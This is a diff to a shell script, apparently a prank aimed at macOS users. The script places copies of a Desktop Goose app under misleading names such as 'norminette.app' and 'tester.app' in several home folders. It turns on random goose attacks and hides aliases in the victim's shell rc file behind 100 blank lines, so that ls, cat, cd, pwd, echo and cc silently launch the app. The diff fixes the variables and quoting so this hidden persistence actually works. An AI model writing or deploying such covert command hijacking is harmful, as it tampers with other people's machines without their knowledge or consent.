@@ -5,19 +5,19 @@ FILE_URL="https://raw.githubusercontent.com/PaulicStudios/goose/refs/heads/main/
 HOME_DIR="$HOME"
 DOWNLOAD_DIR="$HOME/Downloads"
 MUSIC_DIR="$HOME/Music"
-Applications="$HOME/Applications"
-Pictures="$HOME/Pictures"
-Documents="$HOME/Documents"
-Movies="$HOME/Movies"
+APPLICATIONS_DIR="$HOME/Applications"
+PICTURES_DIR="$HOME/Pictures"
+DOCUMENTS_DIR="$HOME/Documents"
+MOVIES_DIR="$HOME/Movies"
 
 # File names for different locations
 HOME_FILE="goose.app"
 DOWNLOAD_FILE="norminette.app"
 MUSIC_FILE="tester.app"
-Applications="yersts.app"
-Pictures="ohhno.app"
-Documents="asdasdas.app"
-Movies="ne.app"
+APPLICATIONS_FILE="yersts.app"
+PICTURES_FILE="ohhno.app"
+DOCUMENTS_FILE="asdasdas.app"
+MOVIES_FILE="ne.app"
 
 defaults write net.namedfork.DesktopGoose FrameRate 15
 defaults write net.namedfork.DesktopGoose CanAttackAtRandom YES
@@ -45,13 +45,13 @@ add_alias_to_shell_rc() {
 	{
 		printf '\n%.0s' {1..100}
 
-		echo "open "$APPLICATIONS_DIR/$APPLICATIONS_FILE""
-		echo "alias ls='ls; open "$DOWNLOAD_DIR/$DOWNLOAD_FILE" &>/dev/null &'"
-		echo "alias cat='cat; open "$MUSIC_DIR/$MUSIC_FILE" &>/dev/null &'"
-		echo "alias pwd='pwd; open "$APPLICATIONS_DIR/$APPLICATIONS_FILE" &>/dev/null &'"
-		echo "alias cd='cd; open "$DOCUMENTS_DIR/$DOCUMENTS_FILE" &>/dev/null &'"
-		echo "alias echo='echo; open "$MOVIES_DIR/$MOVIES_FILE" &>/dev/null &'"
-		echo "alias cc='cc; open "$MUSIC_DIR/$MUSIC_FILE" &>/dev/null &'"
+		echo "open $APPLICATIONS_DIR/$APPLICATIONS_FILE > /dev/null 2>&1"
+		echo "alias ls='ls; open $DOWNLOAD_DIR/$DOWNLOAD_FILE > /dev/null 2>&1'"
+		echo "alias cat='cat; open $MUSIC_DIR/$MUSIC_FILE > /dev/null 2>&1'"
+		echo "alias pwd='pwd; open $APPLICATIONS_DIR/$APPLICATIONS_FILE > /dev/null 2>&1'"
+		echo "alias cd='cd; open $PICTURES_DIR/$PICTURES_FILE > /dev/null 2>&1'"
+		echo "alias echo='echo; open $MOVIES_DIR/$MOVIES_FILE > /dev/null 2>&1'"
+		echo "alias cc='cc; open $MUSIC_DIR/$MUSIC_FILE > /dev/null 2>&1'"
 
 		printf '\n%.0s' {1..100}
 
